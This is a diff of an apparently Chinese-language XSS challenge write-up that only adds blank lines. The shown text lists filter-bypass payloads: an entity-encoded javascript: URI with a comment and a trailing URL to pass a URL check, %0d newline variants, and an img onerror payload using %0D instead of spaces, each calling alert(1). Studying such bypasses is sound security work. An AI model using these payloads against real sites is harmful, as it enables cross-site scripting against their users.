@@ -1,6 +1,7 @@
 #### filter1:替换关键字以及url检测
 思路:html实体编码绕过关键字,使用注释符后加http://绕过校验(或者使用伪协议支持%0d容错性换行解析)
 payload1:```javas&#x63ript:alert(1)//http://www.baidu.com```
+
 payload2:```javas&#x63ript:%0dhttp://www.baidu.com%0dalert(1)```
 ```
 <?php 
@@ -34,6 +35,7 @@ else
 
 #### filte2 替换关键字
 思路:过滤了script可以用on事件，过滤了空格可以用%0d%0a绕过
+
 payload:```<img%0Dsrc=1%0Donerror=alert(1)>```
 ```
 <?php 
